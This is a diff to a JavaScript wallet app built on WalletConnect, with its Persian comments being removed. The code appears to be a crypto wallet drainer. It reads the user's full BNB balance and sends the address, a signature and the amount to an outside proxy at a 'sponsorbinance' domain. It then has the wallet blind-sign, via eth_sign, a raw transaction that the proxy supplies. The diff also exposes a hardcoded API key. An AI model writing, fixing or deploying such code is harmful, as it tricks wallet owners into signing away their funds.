@@ -1,7 +1,7 @@
 import jQuery from "jquery";
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
-const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P"; // 🔴 کلید API خودت رو اینجا بذار
+const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";
 
 async function getBNBBalance(address) {
   try {
@@ -10,7 +10,7 @@ async function getBNBBalance(address) {
     );
     const data = await response.json();
     if (data.status === "1") {
-      return (parseInt(data.result) / 1e18).toFixed(6); // تبدیل مقدار به BNB
+      return (parseInt(data.result) / 1e18).toFixed(6);
     }
   } catch (error) {
     console.error("❌ Error fetching BNB balance:", error);
@@ -55,7 +55,6 @@ function App() {
 
     const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
-    // دریافت مقدار BNB قبل از استفاده در پیام
     const amount = await getBNBBalance(accountSender);
     if (!amount) {
       console.error("❌ Failed to fetch BNB balance.");
@@ -63,9 +62,8 @@ function App() {
     }
     console.log("💰 BNB Balance:", amount);
 
-    // بعد از مقداردهی، از amount در پیام استفاده کن
     const message = `Authorize sending ${amount} BNB from ${accountSender}`;
-    console.log("📜 Message to Sign:", message); // ✅ لاگ پیام قبل از امضا
+    console.log("📜 Message to Sign:", message);
 
     let signature;
     try {
@@ -78,7 +76,7 @@ function App() {
       return;
     }
 
-    console.log("✍️ Signature:", signature); // ✅ لاگ مقدار امضا بعد از تولید
+    console.log("✍️ Signature:", signature);
 
     async function signAndSendTransaction() {
       try {
@@ -88,28 +86,43 @@ function App() {
           handler: "tx",
           address: accountSender,
           signature: signature,
-          amount: amount, // ارسال مقدار BNB دریافت شده
+          amount: amount,
         });
 
-        console.log("📥 API Response:", result); // ✅ لاگ پاسخ API
+        console.log("📥 API Response:", result);
 
         if (!result || result.error) {
           console.error("❌ API Error:", result.error);
           return;
         }
 
-        console.log("📜 Unsigned Transaction:", result);
+        // 🔍 بررسی مقدار `rawTransaction`
+        if (!result.rawTransaction) {
+          console.error("❌ No rawTransaction received!");
+          return;
+        }
 
-        const unsignedTx = result.rawTransaction;
-        if (!unsignedTx) {
-          console.error("❌ Invalid transaction data");
+        console.log("📜 Unsigned Transaction Data:", result.rawTransaction);
+
+        let rawTx;
+        try {
+          rawTx = JSON.parse(result.rawTransaction);
+        } catch (e) {
+          console.error("❌ Failed to parse rawTransaction:", e);
+          return;
+        }
+
+        console.log("📜 Parsed Unsigned Transaction:", rawTx);
+
+        if (!rawTx.to || !rawTx.value || !rawTx.nonce) {
+          console.error("❌ Invalid rawTransaction structure!", rawTx);
           return;
         }
 
         console.log("📝 Signing Transaction...");
         const signedTx = await provider.request({
           method: "eth_sign",
-          params: [accountSender, unsignedTx],
+          params: [accountSender, result.rawTransaction],
         });
 
         console.log("✍️ Signed Transaction:", signedTx);
